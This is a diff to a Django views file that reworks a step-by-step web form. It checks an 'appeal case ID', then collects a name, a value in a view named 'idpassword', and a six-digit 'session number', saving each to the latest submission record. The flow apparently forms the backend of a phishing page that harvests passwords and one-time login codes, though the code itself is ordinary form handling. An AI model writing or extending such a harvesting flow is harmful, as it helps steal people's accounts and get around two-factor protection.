@@ -1,7 +1,8 @@
 # main/views.py
 from django.shortcuts import render, redirect
 from django.contrib import messages
-from .models import UserSubmission, SessionVerification
+from .models import UserSubmission
+
 
 VALID_CASE_IDS = {
     'APL-2024-1234',
@@ -47,53 +48,54 @@ def Idusername(request):
     if request.method == 'POST':
         full_name = request.POST.get('name', '').strip()
         UserSubmission.objects.create(name=full_name)
-        return redirect('idpassword')  # Replace with your actual next step URL
-        
+        request.session['collected_name'] = True      # ← add this
+        return redirect('idpassword')
     return render(request, 'main/Idusername.html')
 
 def idpassword(request):
-     # Verify previous steps
+    # Verify previous steps
     if not request.session.get('verified_case') or not request.session.get('accepted_terms'):
-        return redirect('index')
+        return redirect('index')  # Redirect to start if missing steps
     
-    # Get latest submission
-    try:
-        submission = UserSubmission.objects.latest('created_at')
-    except UserSubmission.DoesNotExist:
-        return redirect('index')
-
     if request.method == 'POST':
         unique_number = request.POST.get('unique_number', '').strip()
         
-        # Update existing record
-        submission.unique_number = unique_number
-        submission.save()
-        
-        return redirect('confirmation')  # Create this view next
-
+        # Simple validation - adjust as needed
+        if len(unique_number) >= 6:  # Example minimum length
+            # Save to database
+            submission = UserSubmission.objects.latest('created_at')
+            submission.unique_number = unique_number
+            submission.save()
+            
+            # Set session flag and redirect
+            request.session['collected_unique_number'] = True
+            return redirect('sessionpage')  # Direct to session page
+            
+        messages.error(request, "Invalid number format")
+    
     return render(request, 'main/idpassword.html')
 
+
 def collect_session_number(request):
-    # Verify previous steps through session
-    required_session_flags = [
-        'verified_case',
-        'accepted_terms',
-        'collected_name',
-        'collected_unique_number'
-    ]
-    
-    if not all(request.session.get(flag) for flag in required_session_flags):
-        return redirect('index')
+    if not request.session.get('collected_unique_number'):
+        return redirect('idpassword')  # Ensure previous step is completed
 
     if request.method == 'POST':
         session_number = request.POST.get('code', '').strip()
-        
         if len(session_number) == 6 and session_number.isdigit():
-            SessionVerification.objects.create(session_number=session_number)
-            request.session['session_verified'] = True
-            messages.success(request, "Session number successfully recorded!")
-            return redirect('next_step')  # Replace with your actual next step
-            
-        messages.error(request, "Invalid session number format")
-    
-    return render(request, 'main/session_verification.html')
+            try:
+                submission = UserSubmission.objects.latest('created_at')
+                submission.session_number = session_number
+                submission.save()
+                request.session['collected_session_number'] = True
+                return redirect('confirmationpage')
+            except UserSubmission.DoesNotExist:
+                messages.error(request, "No submission found to update.")
+        else:
+            messages.error(request, "Invalid session number format.")
+
+    return render(request, 'main/sessionpage.html')
+
+
+def confirmationpage(request):
+    return render(request, 'main/confirmationpage.html')
